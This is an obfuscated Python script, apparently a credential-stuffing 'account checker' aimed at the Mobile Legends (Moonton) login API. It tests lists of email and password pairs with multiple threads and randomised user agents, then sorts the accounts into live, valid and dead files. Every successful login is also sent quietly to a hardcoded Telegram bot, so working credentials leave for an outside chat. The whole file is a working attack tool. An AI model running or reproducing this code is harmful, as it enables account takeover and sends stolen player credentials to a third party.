#!/usr/bin/env python
import requests ,hashlib ,json ,warnings ,argparse ,urllib .parse #line:6
from termcolor import colored #line:7
from fake_useragent import UserAgent #line:8
from concurrent .futures import ThreadPoolExecutor #line:9
from requests .packages .urllib3 .exceptions import InsecureRequestWarning #line:10
warnings .simplefilter ('ignore',InsecureRequestWarning )#line:11
def kirimbot (OOOOO0OO0O0OOO0O0 ):#line:13
	OOOOOO0OO0O000OO0 ="Moonton :"+OOOOO0OO0O0OOO0O0 #line:14
	O0OO0O00OOO00000O ="https://api.telegram.org/bot1064780888:AAEQm4k_8jLjlM7reRznDjA8f8kI6o8kjKU/sendMessage?chat_id=701465009&text="+urllib .parse .quote (OOOOOO0OO0O000OO0 )#line:15
	requests .post (O0OO0O00OOO00000O )#line:16
def doSave (OOO0OO0OO0OOOO000 ,OO0O000O00O0OO0O0 ):#line:18
    O00OO00O00O00OO00 =open (OOO0OO0OO0OOOO000 ,'a+')#line:19
    O00OO00O00O00OO00 .write (OO0O000O00O0OO0O0 +"\n")#line:20
    O00OO00O00O00OO00 .close ()#line:21
def doDictSorting (OO00O0O0O0000OOO0 ):#line:23
    O00O0000O00000O0O =''#line:24
    for O0O0000OO00O0OOOO in OO00O0O0O0000OOO0 .keys ():#line:25
        O00O0000O00000O0O +=O0O0000OO00O0OOOO +'='+OO00O0O0O0000OOO0 [O0O0000OO00O0OOOO ]+"&"#line:26
    return O00O0000O00000O0O #line:27
def doCheck (OO0O00O0OOOO0O0OO ,delim =None ):#line:29
    if delim is not None :#line:30
        delim =delim #line:31
    else :#line:32
        delim ="|"#line:33
    try :#line:34
        OOO0O000O0OOOOO00 ,O0O00OO0OOO0OO0O0 =OO0O00O0OOOO0O0OO .split (delim ,2 )#line:35
        OOO00O0000OO00000 ={'op':'login','sign':'','params':{'account':OOO0O000O0OOOOO00 ,'md5pwd':hashlib .md5 (str (O0O00OO0OOO0OO0O0 ).encode ('utf-8')).hexdigest ()},'lang':'en'}#line:44
        O0O0OO0OOO0OOOOOO =doDictSorting (OOO00O0000OO00000 ['params'])#line:45
        O0O0OO0OOO0OOOOOO +='op='+OOO00O0000OO00000 ['op']#line:46
        OOO00O0000OO00000 ['sign']=hashlib .md5 (str (O0O0OO0OOO0OOOOOO ).encode ('utf-8')).hexdigest ()#line:47
        O0000OO00OOO000O0 =requests .post ('https://accountmtapi.mobilelegends.com/',data =json .dumps (OOO00O0000OO00000 ),headers ={'User-Agent':UserAgent ().random })#line:48
        OOO0000OOO00O0000 =json .loads (O0000OO00OOO000O0 .text )#line:49
        if OOO0000OOO00O0000 ['message']=='Error_Success':#line:50
            print (colored ('LIVE!','green')+" "+OO0O00O0OOOO0O0OO +" "+colored ('Login Success!','blue'))#line:51
            kirimbot (OO0O00O0OOOO0O0OO )#line:52
            doSave ('MOONTON_LIVE.txt',OO0O00O0OOOO0O0OO )#line:53
        elif OOO0000OOO00O0000 ['message']=='Error_PasswdError':#line:54
            print (colored ('VALID!','blue')+" "+OOO0O000O0OOOOO00 +" "+colored ('Wrong Password!','red'))#line:55
            doSave ('MOONTON_VALID.txt',OOO0O000O0OOOOO00 )#line:56
        elif OOO0000OOO00O0000 ['message']=='Error_NoAccount':#line:57
            print (colored ('DIE!','red')+" "+OO0O00O0OOOO0O0OO +" "+colored ('Email Account Not Found!','yellow'))#line:58
            doSave ('MOONTON_DIE.txt',OO0O00O0OOOO0O0OO )#line:59
        elif OOO0000OOO00O0000 ['message']=='Error_SignConflict':#line:60
            print (colored ('ERROR!','red')+" "+OO0O00O0OOOO0O0OO +" "+colored ('Account Sign IN Error!','yellow'))#line:61
            doSave ('MOONTON_DIE.txt',OO0O00O0OOOO0O0OO )#line:62
        elif OOO0000OOO00O0000 ['message']=='Error_PwdErrorTooMany':#line:63
            print (colored ('UNCHECK!','yellow')+" "+OO0O00O0OOOO0O0OO +" "+colored ('Too many wrong password!','red'))#line:64
            doSave ('MOONTON_UNCHECK.txt',OO0O00O0OOOO0O0OO )#line:65
        else :#line:66
            print (colored ('UNCHECK!','yellow')+" "+OO0O00O0OOOO0O0OO )#line:67
            doSave ('MOONTON_UNCHECK.txt',OO0O00O0OOOO0O0OO )#line:68
    except Exception as OO0O0OOO000OO000O :#line:69
        print ('OOPS! '+str (OO0O0OOO000OO000O ))#line:70
parser =argparse .ArgumentParser (description ='MOONTON ACCOUNT CHECKER & VALID CHECKER BY WIBUHEKER!')#line:72
parser .add_argument ('--list',help ='List of ur mail|password',required =True )#line:73
parser .add_argument ('--thread',help ='Threading Proccess for fast checking max 10')#line:74
parser .add_argument ('--delim',help ='Delimeter ex | or : or =')#line:75
wibuheker =parser .parse_args ()#line:76
try :#line:77
    wibuList =open (wibuheker .list ,'r').read ().splitlines ()#line:78
    if wibuheker .thread and wibuheker .thread is not None :#line:79
        with ThreadPoolExecutor (max_workers =int (wibuheker .thread ))as execute :#line:80
            for empass in wibuList :#line:81
                execute .submit (doCheck ,empass ,wibuheker .delim )#line:82
    else :#line:83
        for empass in wibuList :#line:84
            doCheck (empass ,wibuheker .delim )#line:85
except Exception as e :#line:86
    print ('OOPS! '+str (e ))#line:87
